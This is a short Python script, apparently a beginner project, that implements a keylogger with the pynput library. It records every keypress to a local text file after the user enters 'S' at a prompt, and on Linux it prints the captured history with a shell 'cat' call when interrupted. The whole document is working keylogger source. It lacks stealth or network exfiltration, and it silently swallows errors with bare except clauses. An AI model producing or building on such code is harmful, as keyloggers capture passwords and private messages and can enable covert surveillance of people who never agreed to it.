import os

import platform

a=platform.system()

from pynput.keyboard import Listener



def log_key(key):

    try:

        with open("keyhis.txt","a")as f:

            f.write(f"{key}\n")

    except:

       pass

   

def keyloger():    

    try:

    

        with Listener(on_press=log_key) as a:

            a.join()

    except KeyboardInterrupt:

        if platform.system()=='Windows':
            print("Stopped by user")

        elif platform.system()=='Linux':
            print("Your keybord history")
            print(os.system("cat keyhis.txt"))
		

        

    except :

        pass    

n=input("Enter S to start: ").strip().upper()



if n=='S':

    keyloger()

else:

    print("Cannot start")  

#.strip() removes any leading or trailing spaces.

#.upper() ensures the comparison works regardless of uppercase or lowercase input (e.g., "s" and "S" are treated the same)
